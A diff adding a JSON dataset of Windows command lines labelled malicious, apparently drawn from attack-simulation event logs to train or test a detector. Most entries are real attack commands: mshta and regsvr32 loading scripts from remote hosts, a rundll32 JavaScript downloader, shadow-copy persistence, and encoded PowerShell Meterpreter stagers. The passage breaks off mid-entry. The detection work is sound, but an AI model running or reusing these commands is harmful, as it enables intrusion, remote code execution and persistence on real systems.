+    "command": "\"C:\\Windows\\System32\\schtasks.exe\" /Create /sc MINUTE /MO 60 /TN MSOFFICE_ /TR \"mshta.exe https://hotelesms.com/Injection.txt\" /F",
+    "label": 1,
+    "source": "exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "python  winpwnage.py -u execute -i 9 -p c:\\Windows\\system32\\cmd.exe",
+    "label": 1,
+    "source": "exec_sysmon_1_11_lolbin_rundll32_openurl_FileProtocolHandler.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\rundll32.exe\" ieframe.dll,OpenURL c:\\users\\ieuser\\appdata\\local\\temp\\ieframe.url",
+    "label": 1,
+    "source": "exec_sysmon_1_11_lolbin_rundll32_openurl_FileProtocolHandler.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "rundll32.exe  url.dll,OpenURL file://C:/Windows/system32/calc.exe",
+    "label": 1,
+    "source": "exec_sysmon_1_11_lolbin_rundll32_openurl_FileProtocolHandler.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "rundll32.exe  url.dll,FileProtocolHandler calc.exe",
+    "label": 1,
+    "source": "exec_sysmon_1_11_lolbin_rundll32_openurl_FileProtocolHandler.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "rundll32.exe  url.dll,FileProtocolHandler file://C:/Windows/system32/calc.exe",
+    "label": 1,
+    "source": "exec_sysmon_1_11_lolbin_rundll32_openurl_FileProtocolHandler.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "rundll32.exe  url.dll,FileProtocolHandler file:///C:/programdata/calc.hta",
+    "label": 1,
+    "source": "exec_sysmon_1_11_lolbin_rundll32_openurl_FileProtocolHandler.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\mshta.exe\" \"C:\\programdata\\calc.hta\"",
+    "label": 1,
+    "source": "exec_sysmon_1_11_lolbin_rundll32_openurl_FileProtocolHandler.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\calc.exe\"",
+    "label": 1,
+    "source": "exec_sysmon_1_11_lolbin_rundll32_openurl_FileProtocolHandler.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "python  winpwnage.py -u execute -i 12 -p c:\\Windows\\System32\\calc.exe",
+    "label": 1,
+    "source": "exec_sysmon_1_11_lolbin_rundll32_shdocvw_openurl.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\rundll32.exe\" shdocvw.dll,OpenURL c:\\users\\ieuser\\appdata\\local\\temp\\shdocvw.url",
+    "label": 1,
+    "source": "exec_sysmon_1_11_lolbin_rundll32_shdocvw_openurl.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "python  winpwnage.py -u execute -i 14 -p c:\\Windows\\System32\\calc.exe",
+    "label": 1,
+    "source": "exec_sysmon_1_11_lolbin_rundll32_zipfldr_RouteTheCall.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\rundll32.exe\" zipfldr.dll,RouteTheCall c:\\Windows\\System32\\calc.exe",
+    "label": 1,
+    "source": "exec_sysmon_1_11_lolbin_rundll32_zipfldr_RouteTheCall.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "winpm.exe  //e:{16d51579-a30b-4c8b-a276-0ff4dc41e755} winpm_update.js",
+    "label": 1,
+    "source": "exec_sysmon_1_7_jscript9_defense_evasion.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll",
+    "label": 1,
+    "source": "exec_sysmon_1_7_jscript9_defense_evasion.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "python  winpwnage.py -u execute -i 11 -p c:\\Windows\\system32\\calc.exe",
+    "label": 1,
+    "source": "exec_sysmon_1_ftp.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "C:\\Windows\\system32\\cmd.exe /C c:\\Windows\\system32\\calc.exe",
+    "label": 1,
+    "source": "exec_sysmon_1_ftp.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "c:\\Windows\\system32\\calc.exe",
+    "label": 1,
+    "source": "exec_sysmon_1_ftp.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\pcalua.exe\"  -a c:\\Windows\\system32\\calc.exe",
+    "label": 1,
+    "source": "exec_sysmon_1_lolbin_pcalua.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "jabber.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA .\\jabber.dll",
+    "label": 1,
+    "source": "exec_sysmon_1_lolbin_renamed_regsvr32_scrobj.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\rundll32.exe\"  advpack.dll,RegisterOCX c:\\Windows\\System32\\calc.exe",
+    "label": 1,
+    "source": "exec_sysmon_1_lolbin_rundll32_advpack_RegisterOCX.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\rundll32.exe\"  pcwutl.dll,LaunchApplication c:\\Windows\\system32\\calc.exe",
+    "label": 1,
+    "source": "exec_sysmon_1_rundll32_pcwutl_LaunchApplication.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "regsvr32.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll",
+    "label": 1,
+    "source": "exec_sysmon_lobin_regsvr32_sct.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "C:\\Windows\\system32\\vssvc.exe",
+    "label": 1,
+    "source": "Exec_sysmon_meterpreter_reversetcp_msipackage.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\Installer\\MSI4FFD.tmp\"",
+    "label": 1,
+    "source": "Exec_sysmon_meterpreter_reversetcp_msipackage.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "wmic  process list /format:\"https://a.uguu.se/x50IGVBRfr55_test.xsl\"",
+    "label": 1,
+    "source": "exec_wmic_xsl_internet_sysmon_3_1_11.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "wmiadap.exe /F /T /R",
+    "label": 1,
+    "source": "exec_wmic_xsl_internet_sysmon_3_1_11.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "C:\\Windows\\System32\\svchost.exe -k LocalServiceAndNoImpersonation -p -s wcncsvc",
+    "label": 1,
+    "source": "revshell_cmd_svchost_sysmon_1.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\windows\\explorer.exe\" shell:::{769f9427-3cc6-4b62-be14-2a705115b7ab}",
+    "label": 1,
+    "source": "susp_explorer_exec.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "C:\\Windows\\explorer.exe /factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b} -Embedding",
+    "label": 1,
+    "source": "susp_explorer_exec.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"c:\\windows\\system32\\wscript.exe\" /E:vbs c:\\windows\\temp\\icon.ico \"powershell -exec bypass -c \"\"IEX ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFhYPUlFWCgoJ1snICsgW2NoYXJdMHg1MyArICd5c3RlbS5UZXh0LkVuYycgKyBbY2hhcl0weDZmICsgJ2RpbmddOjpBJyArIFtjaGFyXTB4NTMgKyAnQ0lJLkdldCcgKyBbY2hhcl0weDUzICsgJ3RyaW5nKFsnICsgW2NoYXJdMHg1MyArICd5c3RlbS5DJyArIFtjaGFyXTB4NmYgKyAnbnZlcnRdOjpGcicgKyBbY2hhcl0weDZmICsgJ21CYXNlNicgKyBbY2hhcl0weDM0ICsgJycgKyBbY2hhcl0weDUzICsgJ3RyaW5nKChnZXQtYycgKyBbY2hhcl0weDZmICsgJ250ZW50IC1wYXRoICcnYzpcd2luZCcgKyBbY2hhcl0weDZmICsgJ3dzXHRlbXBccGljdHVyZS5qcGcnJykpKScpKTskQkI9SUVYKCgnc3RhcnQtc2xlZXAgMTA7JHM9JFhYOyRkID0gQCgpOyR2ID0gMDskYyA9IDA7d2hpbGUoJGMgLW5lICRzLmxlbmd0aCl7JHY9KCR2KjUyKSsoW0ludDMyXVtjaGFyXSRzWyRjXS0nICsgW2NoYXJdMHgzNCArICcwKTtpZigoKCRjKzEpJTMpIC1lcSAwKXt3aGlsZSgkdiAtbmUgMCl7JHZ2PSR2JTI1NjtpZigkdnYgLWd0IDApeyRkKz1bY2hhcl1bSW50MzJdJHZ2fSR2PVtJbnQzMl0oJHYvMjU2KX19JGMrPTE7fTtbYXJyYXldOjpSZXZlcnNlKCRkKTtJRVgoWycgKyBbY2hhcl0weDUzICsgJ3RyaW5nXTo6SicgKyBbY2hhcl0weDZmICsgJ2luKCcnJycsJGQpKTs7JykpO0lFWCgkQkIp')))\"\"\"",
+    "label": 1,
+    "source": "susp_explorer_exec.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "explorer.exe  /root,\"c:\\windows\\System32\\calc.exe\"",
+    "label": 1,
+    "source": "susp_explorer_exec_root_cmdline_@rimpq_@CyberRaiju.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\win32calc.exe\"",
+    "label": 1,
+    "source": "susp_explorer_exec_root_cmdline_@rimpq_@CyberRaiju.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "cmd  /c desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr",
+    "label": 1,
+    "source": "sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "desktopimgdownldr.exe  /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr",
+    "label": 1,
+    "source": "sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\control.exe\" \"C:\\Users\\IEUser\\Downloads\\Invoice@0582.cpl\",",
+    "label": 1,
+    "source": "sysmon_1_11_rundll32_cpl_ostap.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \"C:\\Users\\IEUser\\Downloads\\Invoice@0582.cpl\",",
+    "label": 1,
+    "source": "sysmon_1_11_rundll32_cpl_ostap.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\SysWOW64\\rundll32.exe\" \"C:\\Windows\\SysWOW64\\shell32.dll\",#44 \"C:\\Users\\IEUser\\Downloads\\Invoice@0582.cpl\",",
+    "label": 1,
+    "source": "sysmon_1_11_rundll32_cpl_ostap.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\wscript.exe\" /e:JScript.Encode /nologo C:\\Users\\IEUser\\AppData\\Local\\Temp\\info.txt",
+    "label": 1,
+    "source": "sysmon_1_11_rundll32_cpl_ostap.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\hh.exe\" C:\\Users\\IEUser\\Desktop\\Fax Record N104F.chm",
+    "label": 1,
+    "source": "Sysmon_Exec_CompiledHTML.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\cmd.exe\" /c copy /Y C:\\Windows\\system32\\rundll32.exe %%TEMP%%\\out.exe > nul && %%TEMP%%\\out.exe javascript:\"\\..\\mshtml RunHTMLApplication \";document.write();h=new%%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://pastebin.com/raw/y2CjnRtH\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im out.exe\",0,true);}",
+    "label": 1,
+    "source": "Sysmon_Exec_CompiledHTML.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "cmd.exe /c whoami /groups",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "whoami  /groups",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "cmd.exe /c %%SYSTEMROOT%%\\system32\\wbem\\wmic.exe /output:C:\\Windows\\TEMP\\htxjGDrk /INTERACTIVE:off /node:localhost Service where(name=\"VSS\") get state",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "C:\\Windows\\system32\\wbem\\wmic.exe  /output:C:\\Windows\\TEMP\\htxjGDrk /INTERACTIVE:off /node:localhost Service where(name=\"VSS\") get state",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "cmd.exe /c %%SYSTEMROOT%%\\system32\\wbem\\wmic.exe /output:C:\\Windows\\TEMP\\CEafXbEl /INTERACTIVE:off /node:localhost Service where(name=\"swprv\") get state",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "C:\\Windows\\system32\\wbem\\wmic.exe  /output:C:\\Windows\\TEMP\\CEafXbEl /INTERACTIVE:off /node:localhost Service where(name=\"swprv\") get state",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "cmd.exe /c %%SYSTEMROOT%%\\system32\\wbem\\wmic.exe /output:C:\\Windows\\TEMP\\YqOMAUgO /INTERACTIVE:off /node:localhost shadowcopy call create \"ClientAccessible\", \"C:\\\"",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "C:\\Windows\\system32\\wbem\\wmic.exe  /output:C:\\Windows\\TEMP\\YqOMAUgO /INTERACTIVE:off /node:localhost shadowcopy call create \"ClientAccessible\", \"C:\\\"",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "cmd.exe /c vssadmin List Shadows| find \"Shadow Copy Volume\"",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "vssadmin  List Shadows",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "find  \"Shadow Copy Volume\"",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "cmd.exe /c %%SYSTEMROOT%%\\system32\\wbem\\wmic.exe process call create \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy7\\\\Windows\\Temp\\svhost64.exe",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "C:\\Windows\\system32\\wbem\\wmic.exe  process call create \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy7\\\\Windows\\Temp\\svhost64.exe",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy7\\\\Windows\\Temp\\svhost64.exe",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "cmd.exe /c %%SYSTEMROOT%%\\system32\\schtasks.exe /create /sc minute /mo 1 /tn \"eyNQLDvUSuvVPg\" /tr \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy7\\\\Windows\\Temp\\svhost64.exe\"",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "C:\\Windows\\system32\\schtasks.exe  /create /sc minute /mo 1 /tn \"eyNQLDvUSuvVPg\" /tr \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy7\\\\Windows\\Temp\\svhost64.exe\"",
+    "label": 1,
+    "source": "sysmon_exec_from_vss_persistence.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\rundll32.exe\" zipfldr.dll,RouteTheCall shell:::{769f9427-3cc6-4b62-be14-2a705115b7ab}",
+    "label": 1,
+    "source": "sysmon_lolbas_rundll32_zipfldr_routethecall_shell.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "vshadow.exe  -nw -exec=c:\\windows\\System32\\osk.exe c:\\",
+    "label": 1,
+    "source": "sysmon_lolbin_bohops_vshadow_exec.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "DrvInst.exe \"1\" \"200\" \"STORAGE\\VolumeSnapshot\\HarddiskVolumeSnapshot11\" \"\" \"\" \"6350c17eb\" \"00000000\" \"000005AC\" \"00000590\"",
+    "label": 1,
+    "source": "sysmon_lolbin_bohops_vshadow_exec.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\osk.exe\"",
+    "label": 1,
+    "source": "sysmon_lolbin_bohops_vshadow_exec.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "vshadow.exe  -nw -exec=c:\\windows\\System32\\notepad.exe c:\\",
+    "label": 1,
+    "source": "sysmon_lolbin_bohops_vshadow_exec.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "DrvInst.exe \"1\" \"200\" \"STORAGE\\VolumeSnapshot\\HarddiskVolumeSnapshot12\" \"\" \"\" \"6d110b0a3\" \"00000000\" \"000005B8\" \"000004B0\"",
+    "label": 1,
+    "source": "sysmon_lolbin_bohops_vshadow_exec.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "rundll32.exe",
+    "label": 1,
+    "source": "Sysmon_meterpreter_ReflectivePEInjection_to_notepad_.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\mshta.exe\" \"C:\\Users\\IEUser\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\S97WTYG7\\update.hta\"",
+    "label": 1,
+    "source": "sysmon_mshta_sharpshooter_stageless_meterpreter.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
+    "label": 1,
+    "source": "sysmon_mshta_sharpshooter_stageless_meterpreter.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" C:\\Users\\IEUser\\Downloads\\updatevbs.html",
+    "label": 1,
+    "source": "sysmon_vbs_sharpshooter_stageless_meterpreter.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Program Files\\Internet Explorer\\iexplore.exe\" SCODEF:540 CREDAT:275457 /prefetch:2",
+    "label": 1,
+    "source": "sysmon_vbs_sharpshooter_stageless_meterpreter.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\IEUser\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\S97WTYG7\\updatevbs.vbs\"",
+    "label": 1,
+    "source": "sysmon_vbs_sharpshooter_stageless_meterpreter.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "cscript.exe  //e:jscript testme.js",
+    "label": 1,
+    "source": "sysmon_zipexec.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\cmdkey.exe\" /generic:Microsoft_Windows_Shell_ZipFolder:filename=C:\\Users\\bouss\\AppData\\Local\\Temp\\lync.zip /pass:tWIMmIF /user:\"\"",
+    "label": 1,
+    "source": "sysmon_zipexec.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Users\\bouss\\AppData\\Local\\Temp\\Temp3_lync.zip\\i.exe\"",
+    "label": 1,
+    "source": "sysmon_zipexec.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\cmdkey.exe\" /delete Microsoft_Windows_Shell_ZipFolder:filename=C:\\Users\\bouss\\AppData\\Local\\Temp\\lync.zip",
+    "label": 1,
+    "source": "sysmon_zipexec.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Program Files\\Elastic\\Endpoint\\elastic-endpoint.exe\"  popup \"Malicious Behavior Detection Alert\" \"Elastic Security detected Execution via Renamed Signed Binary Proxy\" \"C:\\Program Files\\Elastic\\Endpoint\\cache\\resources\\elastic-endpoint-security.png\"",
+    "label": 1,
+    "source": "sysmon_zipexec.evtx",
+    "folder": "Execution"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
+    "label": 1,
+    "source": "ImpersonateUser-via local Pass The Hash Sysmon and Security.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "C:\\Windows\\System32\\mshta.exe -Embedding",
+    "label": 1,
+    "source": "LM_DCOM_MSHTA_LethalHTA_Sysmon_3_1.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "C:\\Windows\\system32\\mmc.exe -Embedding",
+    "label": 1,
+    "source": "LM_impacket_docmexec_mmc_sysmon_01.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\cmd.exe\" /Q /c cd \\ 1> \\\\127.0.0.1\\ADMIN$\\__1556656511.61 2>&1",
+    "label": 1,
+    "source": "LM_impacket_docmexec_mmc_sysmon_01.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\cmd.exe\" /Q /c cd  1> \\\\127.0.0.1\\ADMIN$\\__1556656511.61 2>&1",
+    "label": 1,
+    "source": "LM_impacket_docmexec_mmc_sysmon_01.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\cmd.exe\" /Q /c whoami /all 1> \\\\127.0.0.1\\ADMIN$\\__1556656511.61 2>&1",
+    "label": 1,
+    "source": "LM_impacket_docmexec_mmc_sysmon_01.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "whoami  /all",
+    "label": 1,
+    "source": "LM_impacket_docmexec_mmc_sysmon_01.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\HOSTNAME.EXE\"",
+    "label": 1,
+    "source": "LM_PowershellRemoting_sysmon_1_wsmprovhost.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "C:\\Windows\\system32\\svchost.exe -k localService -p -s RemoteRegistry",
+    "label": 1,
+    "source": "lm_remote_registry_sysmon_1_13_3.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -s -NoLogo -NoProfile",
+    "label": 1,
+    "source": "lm_sysmon_18_remshell_over_namedpipe.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\whoami.exe\"  /all",
+    "label": 1,
+    "source": "lm_sysmon_18_remshell_over_namedpipe.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "rdpclip",
+    "label": 1,
+    "source": "LM_sysmon_1_12_13_3_tsclient_SharpRdp.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"\\\\tsclient\\c\\temp\\stack\\a.exe\"",
+    "label": 1,
+    "source": "LM_sysmon_1_12_13_3_tsclient_SharpRdp.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "c:\\windows\\system32\\notepad.exe",
+    "label": 1,
+    "source": "LM_sysmon_3_12_13_1_SharpRDP.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "\"C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\"",
+    "label": 1,
+    "source": "LM_sysmon_3_12_13_1_SharpRDP.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "C:\\Windows\\Explorer.EXE",
+    "label": 1,
+    "source": "LM_sysmon_3_12_13_1_SharpRDP.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
+    "label": 1,
+    "source": "LM_sysmon_psexec_smb_meterpreter.evtx",
+    "folder": "Lateral Movement"
+  },
+  {
+    "command": "powershell.exe  -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object 